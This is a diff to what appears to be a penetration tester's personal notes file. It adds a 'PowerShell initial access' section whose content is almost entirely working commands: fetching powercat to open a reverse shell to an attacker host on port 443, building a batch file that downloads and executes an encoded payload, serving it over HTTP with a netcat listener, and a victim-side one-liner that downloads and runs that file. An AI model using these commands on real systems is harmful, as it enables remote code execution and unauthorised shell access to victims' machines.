@@ -1436,7 +1436,23 @@ MAIL FROM: <nicholas.barnes@praetorian.com>
 RCPT TO: <test@example.com>
 ```
 
-  
+  # POWERSHELL INITIAL ACCESS
+- Run on attacker machine
+```
+pwsh -c "iex(New-ObjectSystem.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c attacker_ip -p 443 -e cmd.exe -ge" > /tmp/s.txt
+
+echo START /B powershell -c "\$code=(New-Object System.Net.Webclient).DownloadString('http://attacker_ip/s.txt');iex 'powershell -E \$code '" > /tmp/backup.bat
+```
+- Create webserver and listener
+```
+python3 -m http.server 80 --directory /tmp
+
+nc -nvlp 443
+```
+- Run on victim machine
+```
+START /B powershell.exe -c (New-Object System.Net.Webclient).DownloadFile('http://attacker_ip/backup.bat','C:\Windows\Tasks\backup.bat'); IEX 'c:\Windows\Tasks\backup.bat'
+```
   
 
 # 23	ATTACK PATH
@@ -1541,7 +1557,7 @@ RCPT TO: <test@example.com>
 
   
 
-# ENUMERATION NUDGES
+# 25	ENUMERATION NUDGES
 
 - Existence of "dist" directory within website js files. Indicates existence of unnecessary files in the directory that could expand the attack surface.
 - Confirm this by accessing README.md. I.e. "https://openitcockpit/js/vendor/gridstack/README.md"
